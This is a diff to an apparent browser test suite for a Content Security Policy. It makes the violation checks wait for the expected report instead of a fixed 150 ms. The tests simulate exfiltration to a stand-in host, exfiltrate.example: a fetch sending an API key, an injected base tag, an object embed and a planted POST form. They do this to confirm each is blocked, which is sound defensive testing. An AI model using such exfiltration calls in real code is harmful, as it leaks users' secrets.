@@ -183,15 +183,28 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
      JSON.stringify(await page.evaluate(() => window.__violations)));
 
   head('and the things the app never does are now refused');
-  const violated = async (fn, arg) => {
+  /* The report of a blocked action is an event the browser queues, not a return
+     value, and a blocked form submission is reported from the browser process.
+     A fixed 150 ms read the list too soon on the owner's laptop 50 minutes into a
+     full run on the real build: "no violation" for a form that was blocked.
+     So a check that expects a block passes the directive it expects, and this
+     waits up to 5 s for that report; without one, it is still "no violation".
+     A check that expects NO block (Gemini) keeps the short window: absence has no
+     event to wait for. */
+  const violated = async (fn, arg, want) => {
     const before = await page.evaluate(() => window.__violations.length);
     await page.evaluate(fn, arg).catch(() => {});
-    await page.waitForTimeout(150);
+    if (want) {
+      await page.waitForFunction(([n, d]) => window.__violations.slice(n).some(v => v.directive === d),
+        [before, want], { timeout: 5000 }).catch(() => {});
+    } else {
+      await page.waitForTimeout(150);
+    }
     return page.evaluate(n => window.__violations.slice(n), before);
   };
 
   const conn = await violated(() => fetch('https://exfiltrate.example/steal?k=' +
-    encodeURIComponent('the fellow\'s api key')).catch(() => {}));
+    encodeURIComponent('the fellow\'s api key')).catch(() => {}), undefined, 'connect-src');
   ok('a fetch to an unlisted host is blocked by connect-src',
      conn.some(v => v.directive === 'connect-src'), JSON.stringify(conn) || 'no violation');
 
@@ -208,7 +221,7 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
     const b = document.createElement('base');
     b.href = 'https://exfiltrate.example/';
     document.head.appendChild(b);
-  });
+  }, undefined, 'base-uri');
   ok("an injected <base> is refused — it would repoint app.js and all 408 figures",
      base.some(v => v.directive === 'base-uri'), JSON.stringify(base) || 'no violation');
 
@@ -216,7 +229,7 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
     const o = document.createElement('object');
     o.data = 'https://exfiltrate.example/x.swf';
     document.body.appendChild(o);
-  });
+  }, undefined, 'object-src');
   ok('an <object> is refused', obj.some(v => v.directive === 'object-src'),
      JSON.stringify(obj) || 'no violation');
 
@@ -224,7 +237,7 @@ const PAGE = `<!doctype html><html><head>${CSP.META}
     const f = document.createElement('form');
     f.method = 'POST'; f.action = 'https://exfiltrate.example/collect';
     document.body.appendChild(f); f.submit();
-  });
+  }, undefined, 'form-action');
   ok('a planted form cannot submit — pure exfiltration, and the app has none',
      form.some(v => v.directive === 'form-action'), JSON.stringify(form) || 'no violation');
 
